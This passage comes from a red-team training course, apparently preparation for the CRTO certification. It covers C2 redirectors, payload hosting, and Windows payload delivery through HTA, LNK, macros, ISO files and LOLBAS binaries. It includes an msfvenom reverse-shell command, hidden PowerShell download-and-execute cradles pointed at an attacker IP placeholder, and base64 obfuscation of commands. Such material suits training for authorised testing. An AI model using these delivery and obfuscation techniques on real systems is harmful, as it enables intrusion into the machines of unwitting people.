beacons to /mypath and gets tasks from /tasks\r\n        # And your payload is hosted at /payload.exe (different server or same)\r\n\r\n        # Redirect /mypath requests to C2 beacon listener\r\n        # location /mypath {\r\n        #     proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT/mypath;\r\n        #     proxy_set_header Host $host;\r\n        # }\r\n        # location /mypath/ { # Handle trailing slash\r\n        #     proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT/mypath/;\r\n        #     proxy_set_header Host $host;\r\n        # }\r\n\r\n\r\n        # Example: Serve /payload.exe directly from the redirector's web root\r\n        # This requires placing payload.exe in /var/www/html/payload.exe\r\n        # location = /payload.exe { # Use = for exact match\r\n        #     # By default, Nginx will serve from the root directory\r\n        #     # root /var/www/html; # Already defined above\r\n        #     # Add security headers if needed\r\n        #     add_header Content-Type \"application/octet-stream\"; # Suggests download\r\n        # }\r\n\r\n        # Example: Redirect /payload.exe to a DIFFERENT server hosting the payload\r\n        # location = /payload.exe {\r\n        #      proxy_pass http://192.168.1.101:80/payload.exe;\r\n        #      proxy_set_header Host $host;\r\n        # }\r\n\r\n\r\n        # Default catch-all location for anything not matched above (Optional)\r\n        # This could return 404 or redirect to a benign site\r\n        # location / {\r\n        #     # return 404; # Return a Not Found error\r\n        #     # or\r\n        #     # return 302 http://www.google.com; # Redirect to Google\r\n        # }\r\n    }\r\n    ```\r\n    **For the Module Project, start with Option 1 (Simple Proxy All Traffic).** Replace `YOUR_C2_IP` and `YOUR_C2_PORT` with your actual C2 listener details.\r\n\r\n3.  **Test Configuration and Restart:**\r\n    ```bash\r\n    sudo nginx -t\r\n    ```\r\n    If `syntax is ok` and `test is successful`, restart Nginx:\r\n    ```bash\r\n    sudo systemctl restart nginx\r\n    ```\r\n\r\n4.  **Firewall:** Ensure your redirector's firewall allows traffic on port 80. If using `ufw`:\r\n    ```bash\r\n    sudo ufw allow 80/tcp\r\n    sudo ufw enable # if firewall is not active\r\n    ```\r\n\r\n##### Method 3: Socat (Simple Port Forwarding)\r\n\r\nSocat is a command-line utility that can forward ports. It's less flexible than Apache/Nginx (it doesn't understand HTTP headers, paths, etc.), but it's simple for basic port redirection.\r\n\r\n**Steps:**\r\n\r\n1.  **Install Socat:**\r\n    ```bash\r\n    sudo apt update\r\n    sudo apt install socat -y\r\n    ```\r\n\r\n2.  **Run Socat Command:** Replace `REDIRECTOR_PORT`, `YOUR_C2_IP`, and `YOUR_C2_PORT`.\r\n    ```bash\r\n    sudo socat TCP4-LISTEN:REDIRECTOR_PORT,fork TCP4:YOUR_C2_IP:YOUR_C2_PORT\r\n    ```\r\n    *   `TCP4-LISTEN:REDIRECTOR_PORT`: Listen for incoming TCP connections on IPv4 on the specified port (e.g., 80).\r\n    *   `,fork`: This is important! It makes Socat handle each incoming connection in a new child process, allowing multiple simultaneous connections. Without this, only one implant could connect at a time.\r\n    *   `TCP4:YOUR_C2_IP:YOUR_C2_PORT`: Connect to the target C2 server IP and port using IPv4 TCP.\r\n\r\n**Example for redirecting port 80 to C2 on 192.168.1.100:8080:**\r\n```bash\r\nsudo socat TCP4-LISTEN:80,fork TCP4:192.168.1.100:8080\r\n```\r\n\r\n**Note:** Socat runs in the foreground by default. To run it in the background reliably, you might need to use `nohup` or `screen`/`tmux`. For testing, running it directly is fine.\r\n\r\n**Pros:** Simple, quick setup.\r\n**Cons:** No HTTP awareness (cannot modify headers, paths, etc.), harder to manage multiple complex redirection rules, less robust than a full web server.\r\n\r\n##### Testing Your Redirector\r\n\r\nAfter configuring Apache or Nginx, test it from your attacker machine or even the target VM (if routing allows).\r\n\r\n*   **Using `curl`:**\r\n    ```bash\r\n    curl -v http://REDIRECTOR_IP_OR_DOMAIN/\r\n    curl -v http://REDIRECTOR_IP_OR_DOMAIN/any/path/you/want\r\n    ```\r\n    Observe the output. If you used the simple proxy config, you should see content coming from your C2 server's listener (or an error if the C2 isn't running/reachable). If you configured specific paths, test those.\r\n*   **Using a Browser:** Navigate to `http://REDIRECTOR_IP_OR_DOMAIN/`.\r\n*   **Check Redirector Logs:** Look at Apache (`/var/log/apache2/access.log`, `error.log`) or Nginx (`/var/log/nginx/access.log`, `error.log`) logs to see incoming requests and how they were handled.\r\n\r\n#### 3.4 Payload Hosting Techniques\r\n\r\nBesides redirecting implant communication, you also need to *host* the initial payload file that the target will download and execute. This is often done on a web server, but other methods exist.\r\n\r\n*   **Setting up a Basic HTTP/HTTPS Server:**\r\n    *   **Using your Redirector Server:** The easiest way for basic testing is to use the *same* Apache or Nginx server you set up as a redirector.\r\n        *   **Apache:** Place your payload file (e.g., `payload.exe`, `payload.hta`) in the default web root directory, typically `/var/www/html/`. Ensure the file permissions allow the web server process to read it. You can then access it via `http://REDIRECTOR_IP_OR_DOMAIN/payload.exe`.\r\n        *   **Nginx:** Similar to Apache, place files in `/var/www/html/`.\r\n    *   **Using Python SimpleHTTPServer:** For quick, temporary hosting, Python's built-in HTTP server is useful. Navigate to the directory containing your payload file in the terminal and run:\r\n        ```bash\r\n        python3 -m http.server 80\r\n        ```\r\n        This serves files from the current directory on port 80 (or specify a different port). **Warning:** This is NOT secure or robust for anything beyond basic lab testing. It's a quick way to serve a file locally or on a trusted network segment.\r\n\r\n*   **Hosting Payloads on SMB Shares:**\r\n    *   Attackers can host payloads on SMB shares they control and use techniques like `copy` or `wmic` to retrieve and execute them.\r\n    *   Requires setting up an SMB share (e.g., on a Windows attacker VM, or using tools like `Impacket`'s `smbserver.py` on Linux).\r\n    *   Example (conceptual, using `Impacket`):\r\n        *   On attacker Linux: `sudo smbserver.py sharename /path/to/payloads -smb2support`\r\n        *   On target Windows: `copy \\\\ATTACKER_SMB_IP\\sharename\\payload.exe C:\\Temp\\payload.exe`\r\n\r\n*   **Using WebDAV for Payload Delivery:**\r\n    *   WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP that allows clients to perform remote web content authoring operations. Windows has built-in support for WebDAV shares, which can sometimes be mounted or accessed directly.\r\n    *   Less common than simple HTTP hosting for initial download, but relevant for certain lateral movement or file transfer techniques.\r\n\r\n*   **Introduction to Setting up Simple Phishing Landing Pages (Conceptual):**\r\n    *   While the *payload hosting* is technical, the *delivery mechanism* often involves social engineering. A phishing page is designed to look legitimate (e.g., a fake login page, a file download site).\r\n    *   The link in a phishing email or message points to this landing page, which then tricks the user into downloading and executing your hosted payload.\r\n    *   Setting up full phishing pages is outside the scope of this module's *practical* components, but understand that your hosted payload often lives behind such a page or a direct link delivered via social means.\r\n\r\n#### 3.5 Introduction to DNS Tunneling (Conceptual Overview)\r\n\r\n*   DNS tunneling is a technique that encodes data within DNS queries and responses.\r\n*   **How it works (Simplified):** The implant wants to send data (\"hello_c2\"). It breaks this data into chunks. For each chunk, it performs a DNS query for a subdomain like `chunk1.chunk2.hello_c2.your_malicious_domain.com`. The malicious DNS server (controlled by the attacker) receives this query, extracts the data (`hello_c2`), and can respond with instructions encoded in the DNS response (e.g., in a TXT record).\r\n*   **Why use it?** DNS traffic is very common and often less inspected by firewalls/proxies than HTTP. It can bypass certain network restrictions.\r\n*   **Limitations:** Slower, lower bandwidth, requires a dedicated domain and malicious DNS server setup. More complex to implement.\r\n\r\n#### 3.6 Choosing Infrastructure Providers and Operational Security (OpSec) Considerations\r\n\r\n*   **Providers:**\r\n    *   **VPS (Virtual Private Server):** DigitalOcean, Linode, Vultr, AWS EC2, Azure VMs, Google Cloud. Choose providers that are less likely to suspend instances quickly or require excessive verification. Pay with cryptocurrency or non-attributable methods if OpSec is critical (though for CRTO prep, standard payment is fine).\r\n    *   **Dedicated Servers:** More expensive, more control.\r\n    *   **Compromised Infrastructure:** Real attackers often use compromised servers as redirectors or C2 servers, adding a layer of obfuscation and deniability. (Illegal for simulation unless explicitly in scope and authorized!).\r\n*   **OpSec Considerations for C2 Infrastructure:**\r\n    *   **Separate Infrastructure:** NEVER run your C2 server or redirectors from your personal machine or home IP. Use cloud instances or VPS.\r\n    *   **Non-Attributable Accounts/Payment:** (Important for real ops, less so for CRTO lab, but understand the concept). Use prepaid cards, crypto, fake details if necessary (within legal/ethical bounds of your activity!).\r\n    *   **Management VPN/Proxy:** Access your C2 server and redirectors only via a VPN or a series of proxies (SOCKS chains, SSH tunnels). Avoid direct SSH connections from your real IP.\r\n    *   **Minimal Services:** Only run the absolute necessary services (Apache/Nginx on required ports, C2 framework listener). Turn off SSH if not needed, or restrict access via firewall.\r\n    *   **Secure Configuration:** Harden your Linux server (SSH keys instead of passwords, fail2ban, etc.).\r\n    *   **Logging:** Understand what logs your provider keeps. Configure your own logging (as in Module 2, but for the *attacker* side) for troubleshooting, but be mindful of retention.\r\n    *   **Clean-up:** Have a plan to quickly tear down infrastructure if detected or at the end of an engagement.\r\n    *   **Domain Names:** Use cheap, disposable domain names. Consider domain privacy services (though their effectiveness varies). Dynamic DNS can be an alternative for labs.\r\n\r\n#### Connecting Back to the Lab Environment (Module 2)\r\n\r\nIn your lab setup (Module 2), you have target VMs (Windows client, Domain Controller) and potentially a SIEM. Your C2 infrastructure (Module 3) typically lives *outside* this internal network, or at least on a separate segment.\r\n\r\n*   **Redirector Role:** The redirector you set up will have an IP address that your target VM can reach. In a real engagement, this is a public IP. In your lab, this might be an IP on the same virtual network, or you might simulate a public IP by configuring NAT/port forwarding on your host machine or a router VM.\r\n*   **C2 Server Role:** Your actual C2 server might be another VM in your lab (e.g., a Kali VM running a C2 framework) on a different IP, or even hosted in the cloud. The redirector you configured will forward traffic from the target VM's beacon to this C2 server's listener port.\r\n\r\n**Diagram (Conceptual):**\r\n\r\n```\r\n+-----------------+     +---------------------+     +-----------------+     +---------------------+\r\n| Target Workstation| --> | Redirector (Nginx/Apache) | --> | C2 Server (C2 Framework) | --> | Operator Machine (GUI/CLI) |\r\n| (Windows VM)    |     | (Linux VM/VPS)      |     | (Linux VM/VPS)  |     |                     |\r\n| - Runs Implant  |     | - Listens on 80/443 |     | - Listens on 8080 |     | - Manages Implants  |\r\n+-----------------+     | - Forwards to C2    |     |                 |     +---------------------+\r\n        ^               +---------------------+     +-----------------+\r\n        | (Payload DL)          ^\r\n        |                       | (Payload Hosting)\r\n        |               +---------------------+\r\n        |               | Web Server (Apache/Nginx) |\r\n        |               | (Often same as Redirector)|\r\n        |               | - Hosts payload.exe/hta   |\r\n        +---------------+---------------------+\r\n\r\n+-----------------+\r\n| SIEM (Splunk/ELK)| <--- Windows Logs (Sysmon, Security, etc.)\r\n| (Linux/Windows VM)|\r\n+-----------------+\r\n```\r\nYour Module 2 lab provides the \"Target Workstation\" and the \"SIEM\". Module 3 builds the \"Redirector\" and \"Web Server\" components, and prepares you conceptually for the \"C2 Server\" (which you'll interact with more in later modules)."
    },
    {
      "title": "module_4",
      "description": "module_4 Overview",
      "order": 4,
      "content": "Alright team, welcome back! We've set the stage, understood the *why* behind adversary simulation, planned our hypothetical engagement, and even built the foundational infrastructure – our lab environment with logging and our initial C2 redirector/hosting server. That's massive progress!\r\n\r\nNow, let's talk about the *how*. How do we actually get our foot in the door? How do we get that initial piece of code, that \"payload,\" onto the target machine, and how do we make it talk back to our C2? This is where the rubber meets the road. This module, **Module 4: Crafting and Delivering Initial Payloads**, is all about understanding the tools of the trade and the sneaky ways adversaries get their initial code onto a system. We're building the weapon that will initiate our simulated attack. Let's dive in!\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 4: Crafting and Delivering Initial Payloads\r\n\r\n*   **Module Objective:** By the end of this module, learners will be able to understand different payload types and common delivery vectors used to get code onto a target machine.\r\n\r\n---\r\n\r\nAlright, listen up! Before we can *execute* anything (that's Module 5!), we need something *to* execute. That's our payload. Think of the payload as the malicious code itself – the set of instructions we want the target machine to run. But not all payloads are created equal, and getting them *onto* the system is half the battle.\r\n\r\n#### 4.1 Payload Types: Stager vs. Stageless\r\n\r\nThis is a fundamental concept. Payloads generally fall into two categories:\r\n\r\n*   **Stageless Payloads:**\r\n    *   **Concept:** These payloads contain *all* the necessary code within themselves. They are self-contained. Once executed, they perform their function (like opening a shell, running a command, connecting back to a C2) without needing to download further code.\r\n    *   **Pros:** Simpler to deploy, less reliance on a second network connection immediately after initial execution, potentially faster initial action. Can be useful for simple tasks or when network connectivity might be unreliable after the initial hit.\r\n    *   **Cons:** Larger file size (can be harder to deliver via size-limited vectors like emails), higher chance of detection by static analysis (as the full malicious code is present on disk or in memory immediately).\r\n    *   **Analogy:** Imagine receiving a complete, fully assembled gadget in a single box. You just open the box and use it.\r\n\r\n*   **Stager Payloads:**\r\n    *   **Concept:** These are small, lightweight payloads whose *only* job is to connect back to the attacker's server (the C2 or a dedicated listener) and download the *real*, larger payload (often called the \"stage\").\r\n    *   **Pros:** Very small initial size (excellent for constrained delivery methods like phishing emails, exploits with limited buffer space), the main malicious code isn't initially present on disk, making static analysis harder on the initial file. The second stage can be encrypted or obfuscated more heavily.\r\n    *   **Cons:** Requires a second successful network connection *immediately* after the stager executes. If the target can't reach the C2/listener or the connection is blocked/detected, the attack stops after the stager runs. More complex setup (listener needs to be ready to send the stage).\r\n    *   **Analogy:** Imagine receiving a tiny key. The key's only purpose is to unlock a larger box (the stage) waiting for you somewhere else.\r\n\r\n**Which to choose?** It depends entirely on your simulation goals and the delivery vector. Phishing attachments often use stagers due to size limits. Exploits might use stagers to minimize the code in the exploit buffer. Manual execution or dropping files might use stageless for simplicity. For CRTO, you'll likely work with both concepts, and your chosen C2 framework will handle the stager/stage process behind the scenes, but understanding *why* is key for troubleshooting and evasion.\r\n\r\n#### 4.2 Generating Basic Payloads\r\n\r\nWhile real adversary simulations use sophisticated payloads from C2 frameworks, for learning, tools like Metasploit's `msfvenom` are invaluable for generating *basic* examples to understand formats and concepts. Your C2 framework (like Cobalt Strike, Mythic, Sliver, PoshC2, etc.) will have its own payload generation capabilities, which you'll use in practice.\r\n\r\nLet's look at `msfvenom` for illustrative purposes. We'll generate a simple Windows executable that just runs `calc.exe`. This isn't a C2 implant, but it's a simple payload we can test delivery methods with.\r\n\r\n```bash\r\n# Generate a Windows executable payload that runs calc.exe\r\n# -p: specify the payload (windows/exec)\r\n# CMD: the command to execute (calc.exe)\r\n# -f: the output format (exe)\r\n# -o: output file name\r\nmsfvenom -p windows/exec CMD=calc.exe -f exe -o calc.exe\r\n```\r\n\r\nThis command generates a file named `calc.exe`. If you run this `calc.exe` on a Windows machine, it will simply open the calculator. Why is this useful? It's a simple, self-contained piece of code we can use to test *if* our chosen delivery method successfully executes *arbitrary code* on the target.\r\n\r\nFor a simple stageless PowerShell payload that might connect back (conceptually, we'll cover the listener later), you might see something like:\r\n\r\n```bash\r\n# Example (conceptual) - Generate a PowerShell stageless payload\r\n# This is just to show the -p and -f options for PowerShell\r\n# The actual command for a reverse shell is more complex and needs a listener\r\nmsfvenom -p windows/powershell_stageless_reverse_tcp LHOST=<Your_Attacker_IP> LPORT=<Your_Listen_Port> -f raw -o rev_shell.ps1\r\n```\r\n\r\n**Key takeaway:** `msfvenom` helps you see different payload *formats* (`.exe`, `.dll`, `.ps1`, raw shellcode) which are relevant to our delivery methods. Your C2 framework will handle generating the *actual* implant code in these formats, often with built-in obfuscation and profile adherence.\r\n\r\n#### 4.3 Common Delivery Methods\r\n\r\nThis is where the creativity comes in. How do we get our payload (`calc.exe`, `rev_shell.ps1`, or even just a command to run something remote) onto the target and executed? Adversaries constantly innovate here, but many classic techniques rely on abusing built-in Windows features or common user actions (like opening a document).\r\n\r\nHere are some common initial access/delivery vectors you'll encounter and potentially simulate:\r\n\r\n##### 4.3.1 HTA (HTML Applications) and `mshta.exe`\r\n\r\n*   **What they are:** HTA files are basically HTML files with a `.hta` extension that are executed by `mshta.exe` (Microsoft HTML Application host). They can contain scripting languages like VBScript and JScript.\r\n*   **Why adversaries use them:** `mshta.exe` is a legitimate Windows binary (a LOLBAS!). It executes code outside the browser security model. HTA files can be delivered via email, hosted on web servers, etc.\r\n*   **How it works:** An HTA file is opened by `mshta.exe`, which then executes the scripts within it.\r\n*   **Simple Example:**\r\n\r\n    ```html\r\n    <!-- my_payload.hta -->\r\n    <html>\r\n    <head>\r\n    <title>Hello</title>\r\n    <HTA:APPLICATION\r\n        APPLICATIONNAME=\"MyPayload\"\r\n        WINDOWSTATE=\"hidden\"\r\n        SHOWINTASKBAR=\"no\"\r\n        BORDER=\"none\"\r\n        SINGLEINSTANCE=\"yes\"\r\n    >\r\n    </head>\r\n    <body>\r\n    <script language=\"VBScript\">\r\n    ' VBScript code to execute\r\n    ' Example: Run calc.exe\r\n    CreateObject(\"Wscript.Shell\").Run \"calc.exe\"\r\n\r\n    ' Example: Download and execute a remote script (Module 5 territory!)\r\n    ' CreateObject(\"Wscript.Shell\").Run \"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<Your_Attacker_IP>/script.ps1')\"\r\n\r\n    ' Exit the HTA application gracefully\r\n    window.close()\r\n    </script>\r\n    </body>\r\n    </html>\r\n    ```\r\n    *   **Execution Command:** You would host this `.hta` file (e.g., on your Module 3 web server) and then execute it on the target using:\r\n        ```cmd\r\n        mshta http://<Your_Attacker_IP>/my_payload.hta\r\n        ```\r\n        Or, if the file is already on the target:\r\n        ```cmd\r\n        mshta C:\\path\\to\\my_payload.hta\r\n        ```\r\n\r\n##### 4.3.2 LNK (Shortcut Files)\r\n\r\n*   **What they are:** Standard Windows shortcut files (`.lnk`).\r\n*   **Why adversaries use them:** Users are accustomed to clicking `.lnk` files. They can be placed on network shares, USB drives, or within ISO/IMG files. Crucially, their `Target` property can execute commands, not just launch applications.\r\n*   **How it works:** The `.lnk` file's properties are crafted to execute a command or script when clicked.\r\n*   **Simple Example:** You can't easily show the \"code\" of an LNK, but you configure its properties:\r\n    *   Right-click -> New -> Shortcut\r\n    *   In the \"Type the location of the item\" field, instead of an application path, put a command, like:\r\n        ```cmd\r\n        C:\\Windows\\System32\\cmd.exe /c calc.exe\r\n        ```\r\n        Or to download and execute a script:\r\n        ```cmd\r\n        C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<Your_Attacker_IP>/script.ps1')\r\n        ```\r\n    *   You can also set the \"Start in\" directory and \"Run\" (normal, minimized, maximized). Adversaries often change the icon to look like a document or folder.\r\n\r\n##### 4.3.3 Macro-Enabled Documents (Word, Excel) - Introduction to VBA Execution\r\n\r\n*   **What they are:** Office documents (`.docm`, `.xlsm`, `.pptm`) containing VBA (Visual Basic for Applications) code.\r\n*   **Why adversaries use them:** Social engineering! Users open documents. VBA is powerful and can interact with the operating system.\r\n*   **How it works:** Malicious VBA code is embedded in the document. Functions like `Auto_Open`, `Document_Open`, `Workbook_Open` execute automatically when the document is opened (if macros are enabled).\r\n*   **Simple Example (Conceptual):**\r\n    ```vba\r\n    ' In a Word document's VBA editor (Alt+F11)\r\n    ' Insert a new Module or put this in ThisDocument\r\n    Sub AutoOpen()\r\n        ' This code runs automatically when the document is opened (if macros enabled)\r\n        Call Shell(\"calc.exe\", vbNormalFocus)\r\n    End Sub\r\n\r\n    ' Or for Excel, in ThisWorkbook\r\n    Sub Workbook_Open()\r\n        Call Shell(\"calc.exe\", vbNormalFocus)\r\n    End Sub\r\n    ```\r\n*   **Challenges:** Microsoft has significantly increased macro security warnings and disabled internet-based macros by default in newer Office versions, making this harder but not impossible (e.g., if the file is marked as trusted, or delivered via a local network share).\r\n\r\n##### 4.3.4 ISO/IMG File Smuggling\r\n\r\n*   **What they are:** Disk image files (`.iso`, `.img`).\r\n*   **Why adversaries use them:** In modern Windows versions, mounting an ISO/IMG file is as simple as double-clicking it. It mounts as a virtual drive letter. Crucially, files *inside* the mounted ISO/IMG are often treated as if they are on a trusted drive, sometimes bypassing Mark-of-the-Web (MOTW) security flags that are applied to files downloaded directly. Adversaries place malicious `.lnk`, `.hta`, or `.exe` files inside the ISO.\r\n*   **How it works:** User opens the ISO/IMG -> Windows mounts it as a drive (e.g., D:) -> User navigates the virtual drive and clicks on a malicious file (often disguised).\r\n*   **Example:** Create an ISO containing a malicious `.lnk` file that executes your payload. Send the ISO to the user.\r\n\r\n##### 4.3.5 Executable Payloads (.exe)\r\n\r\n*   **What they are:** Standard Windows executable files.\r\n*   **Why adversaries use them:** It's the most direct way to run code.\r\n*   **How it works:** User double-clicks the `.exe`, or it's launched via a script/command.\r\n*   **Challenges:** `.exe` files from the internet are heavily scrutinized by AV/EDR. Requires significant obfuscation (Module 6 topic!) to avoid detection. Often used when other vectors fail or in later stages.\r\n\r\n##### 4.3.6 Introduction to .NET Assemblies as Payloads\r\n\r\n*   **What they are:** Executables or DLLs written using the .NET framework.\r\n*   **Why adversaries use them:** .NET is common on Windows. .NET assemblies can be executed in memory using tools like PowerSploit's `Invoke-ReflectivePEInjection` or converted to shellcode using tools like Donut. They can also be executed via LOLBAS like `InstallUtil.exe` or `RegAsm.exe`.\r\n*   **How it works:** The .NET runtime executes the code. Using LOLBAS like `InstallUtil.exe` allows execution without the `.exe` or `.dll` extension being directly invoked by the user or a standard loader.\r\n*   **Example (Conceptual `InstallUtil.exe`):**\r\n    ```cmd\r\n    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /uninstall /U C:\\path\\to\\malicious.dll\r\n    ```\r\n    *(This is a common pattern, abusing the uninstall functionality to run code in a specific method)*\r\n\r\n##### 4.3.7 Understanding DLL Payloads and `rundll32.exe`\r\n\r\n*   **What they are:** Dynamic Link Libraries (`.dll`).\r\n*   **Why adversaries use them:** `.dll` files are less commonly scanned than `.exe` files by some older security tools. `rundll32.exe` is a LOLBAS that can execute code within a DLL's export function.\r\n*   **How it works:** `rundll32.exe` is invoked with the path to the DLL and the name of an exported function to execute.\r\n*   **Simple Example:**\r\n    ```cmd\r\n    rundll32.exe C:\\path\\to\\malicious.dll,ExportFunctionName\r\n    ```\r\n    Adversaries write DLLs with specific export functions (e.g., named `Go`, `Entry`, or randomized names) that contain their payload code.\r\n\r\n##### 4.3.8 Custom Launchers: Introduction to tools like Donut\r\n\r\n*   **What they are:** Tools or custom code that take a payload (like an EXE, DLL, or .NET assembly) and convert it into raw shellcode that can be executed directly in memory.\r\n*   **Why adversaries use them:** Running code directly in memory (shellcode) avoids writing a malicious executable to disk, making it harder for file-based signatures to detect. It also allows injecting the payload into legitimate processes (Module 6!).\r\n*   **How it works:** Tools like Donut parse the input file (.NET assembly, PE), convert its sections and metadata into position-independent shellcode, and add a small stub to load and execute it. This shellcode can then be injected into a running process or executed by a small, custom loader.\r\n*   **Example:** Using Donut to convert a .NET `calc.exe` program into shellcode.\r\n    ```bash\r\n    # Assuming you have donut installed and your .NET exe is mycalc.exe\r\n    donut mycalc.exe -o mycalc.bin\r\n    ```\r\n    The output `mycalc.bin` is raw shellcode. You would then need another technique (like process injection) to execute this shellcode on the target. This is a common technique seen in more advanced attacks.\r\n\r\n#### 4.4 Encoding and Basic Obfuscation for Delivery\r\n\r\nWhile Module 6 goes deep into evading AV/EDR signatures on the payload *itself*, this module touches on basic techniques to make the *delivery command* or the *script used for delivery* less obvious.\r\n\r\n*   **Goal:** Avoid detection based on easily recognizable strings in command lines or simple scripts.\r\n*   **Techniques:**\r\n    *   **Base64 Encoding:** Commonly used for PowerShell scripts. The `-EncodedCommand` argument in PowerShell allows executing a base64 encoded string.\r\n        ```bash\r\n        # Original command:\r\n        # IEX(New-Object Net.WebClient).DownloadString('http://<Attacker_IP>/script.ps1')\r\n\r\n        # Encode it (using PowerShell itself or online tools):\r\n        # [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"IEX(New-Object Net.WebClient).DownloadString('http://<Attacker_IP>/script.ps1')\"))\r\n\r\n        # Execution command using encoded string:\r\n        powershell.exe -nop -w hidden -enc <base64_string>\r\n        ```\r\n        This makes the command line look like gibberish to simple string scanners, although defenders look for `-enc` and decode it.\r\n    *   **Simple String Manipulation/Obfuscation:** In scripts (VBScript, JScript, PowerShell), you can break up strings, concatenate them, use character codes, etc., to hide commands or URLs.\r\n        ```vbs\r\n        ' Example in VBScript (for HTA):\r\n        ' Original: CreateObject(\"Wscript.Shell\").Run \"calc.exe\"\r\n        ' Obfuscated:\r\n        cmd = \"calc\" & \".exe\"\r\n        CreateObject(\"Wscript.Shell\").Run cmd\r\n        ```\r\n        This is a trivial example, but adversaries use much more complex versions.\r\n\r\nThese basic techniques are often just enough to bypass simple static analysis on the delivery file or command line.\r\n\r\n#### Connecting to Your Infrastructure (Module 3 Review)\r\n\r\nRemember that web server or SMB share you set up in Module 3? This is where your payload files (HTA, LNK, `.exe`, `.ps1`, etc.) will live so the target machine can access them.\r\n\r\n*   If you're using an HTA delivered via `mshta http://...`, the HTA file needs to be on your web server.\r\n*   If you're delivering an `.exe` or `.ps1` file for the target to download, it needs to be hosted on your web server or SMB share.\r\n*   If you're using an ISO/IMG, the malicious files go *inside* the ISO, which is then hosted (e.g., on the web server).\r\n\r\nThis module is about preparing the payload and understanding the *mechanism* to get it there. Module 5 is about triggering that mechanism!\r\n\r\n---\r\n\r\n### Module Project/Exercise: Craft and Host a Test Payload\r\n\r\nAlright team, time to get hands-on and build our first piece of the attack chain! We're going to create a simple payload and host it so it's ready for execution in the next module.\r\n\r\n**Project 4.1: Create and Host a Test Payload**\r\n\r\n**Objective:** Generate a simple, stageless payload and make it accessible to your target VM via a chosen delivery vector, leveraging the infrastructure built in Module 3.\r\n\r\n**Steps:**\r\n\r\n1.  **Choose Your Simple Payload Action:** For this test, we don't need a full C2 callback yet. A simple action like running `calc.exe` or running a command that touches a file will suffice to demonstrate execution. Let's aim for a PowerShell command that runs `calc.exe`.\r\n    ```\r\n    powershell.exe -nop -w hidden -c \"Start-Process calc.exe\"\r\n    ```\r\n    *(`-nop`: No profile, `-w hidden`: Window hidden, `-c`: Command)*\r\n\r\n2.  **Choose ONE Delivery Method:** Select one method from Section 4.3 that you want to implement. HTA and LNK are good starting points as they are relatively simple to demonstrate hosting. Let's use **HTA** for this example walkthrough, as it combines hosting and script execution nicely.\r\n\r\n3.  **Craft the Payload Script/File:** Based on your chosen method (HTA) and payload action (run `calc.exe` via PowerShell), create the necessary file.\r\n\r\n    *   **For HTA:** Create a file named `run_calc.hta` with the following content:\r\n\r\n        ```html\r\n        <!-- run_calc.hta -->\r\n        <html>\r\n        <head>\r\n        <title>Loading...</title>\r\n        <HTA:APPLICATION\r\n            APPLICATIONNAME=\"Loader\"\r\n            WINDOWSTATE=\"hidden\"\r\n            SHOWINTASKBAR=\"no\"\r\n            BORDER=\"none\"\r\n            SINGLEINSTANCE=\"yes\"\r\n        >\r\n        </head>\r\n        <body>\r\n        <script language=\"VBScript\">\r\n        ' Define the PowerShell command\r\n        ' We use Chr() to break up the string and make it slightly less obvious\r\n        ' This is basic obfuscation!\r\n        ps_cmd = \"powershell.exe -nop -w hidden -c \"\"Start-Process calc.exe\"\"\"\r\n\r\n        ' Execute the command\r\n        CreateObject(\"Wscript.Shell\").Run ps_cmd, 0 ' The '0' means hide the window\r\n\r\n        ' Exit the HTA application\r\n        window.close()\r\n        </script>\r\n        </body>\r\n        </html>\r\n        ```\r\n        *Self-Correction:* Using `Chr()` for obfuscation might be a bit much for \"basic\" in this context. Let's simplify the VBScript for clarity in this foundational step, focusing just on the delivery mechanism. We'll add obfuscation in Module 6.\r\n\r\n        **Revised `run_calc.hta` (Simpler):**\r\n\r\n        ```html\r\n        <!-- run_calc.hta -->\r\n        <html>\r\n        <head>\r\n        <title>Loading...</title>\r\n        <HTA:APPLICATION\r\n            APPLICATIONNAME=\"Loader\"\r\n            WINDOWSTATE=\"hidden\"\r\n            SHOWINTASKBAR=\"no\"\r\n            BORDER=\"none\"\r\n            SINGLEINSTANCE=\"yes\"\r\n        >\r\n        </head>\r\n        <body>\r\n        <script language=\"VBScript\">\r\n        ' Execute the PowerShell command directly\r\n        CreateObject(\"Wscript.Shell\").Run \"powershell.exe -nop -w hidden -c \"\"Start-Process calc.exe\"\"\", 0\r\n\r\n        ' Exit the HTA application\r\n        window.close()\r\n        </script>\r\n        </body>\r\n        </html>\r\n        ```\r\n        *Okay, this is much clearer for demonstrating the HTA delivery mechanism itself.*\r\n\r\n4.  **Host the Payload:** Use the web server you set up in Module 3.\r\n    *   Access your Linux VM/server (your C2 infrastructure host).\r\n    *   Navigate to the web server's root directory (e.g., `/var/www/html/` for Apache, `/usr/share/nginx/html/` for Nginx).\r\n    *   Copy the `run_calc.hta` file into this directory.\r\n    *   Ensure your web server service is running (`sudo systemctl start apache2` or `sudo systemctl start nginx`).\r\n\r\n5.  **Verify Accessibility (Optional but Recommended):** From your *target workstation VM* (or even your attacker machine), try to access the file using a web browser or `curl`.\r\n    *   Open a browser on the target VM and go to `http://<Your_C2_Infrastructure_Public_IP_or_Internal_IP>/run_calc.hta`.\r\n    *   The browser might download the file, or if configured to handle HTAs, might try to run it (cancel it for now!). The point is to verify the file is accessible over HTTP. If it downloads or shows the code, success! If not, check your web server configuration, firewall rules, and IP addresses.\r\n\r\n**Troubleshooting Tip:** Make sure the IP address you're using in the URL (`<Your_C2_Infrastructure_Public_IP_or_Internal_IP>`) is reachable from the target VM. If your C2 server is a cloud VM, you might need its public IP. If it's a Linux VM in your local lab, use its internal network IP.\r\n\r\n**Project Output:** At the end of this project, you should have your `run_calc.hta` file sitting on your web server, ready to be accessed and executed by the target machine in the next module. You should also understand *why* you chose that delivery method and how the payload works.\r\n\r\n**Contribution to Capstone:** This project provides the crucial component – the payload and the mechanism to get it delivered – that will be used in Module 5 to achieve initial execution and get a callback (or in this case, run `calc.exe` as a demonstration). It directly integrates with your Module 3 infrastructure.\r\n\r\n---\r\n\r\nFantastic work, team! You've now got your hands dirty creating a 